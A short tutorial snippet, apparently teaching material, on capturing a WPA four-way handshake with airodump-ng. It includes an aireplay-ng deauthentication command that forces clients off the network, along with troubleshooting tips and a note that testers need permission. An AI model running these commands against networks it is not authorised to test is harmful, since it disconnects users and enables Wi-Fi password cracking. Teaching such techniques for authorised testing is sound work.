Core Concept
Capturing the four-way handshake
Run airodump-ng with the target BSSID and channel, and save the capture. Force a reconnect if needed via deauthentication.
Command sequence (visual)
sudo airodump-ng --bssid <TARGET_AP_BSSID> -c <CHANNEL> -w wpa_capture wlan0mon
# in a new terminal to force reconnect
sudo aireplay-ng --deauth 5 -a <TARGET_AP_BSSID> -c <CLIENT_MAC> wlan0mon
Checks & troubleshooting
  • Confirm monitor interface and channel lock.
  • Verify airodump-ng shows the target BSSID and clients.
  • Look for the explicit 'WPA Handshake' indicator to ensure completeness.
Ethical note: Deauthentication disconnects users. Use minimal packets and always have permission to test.
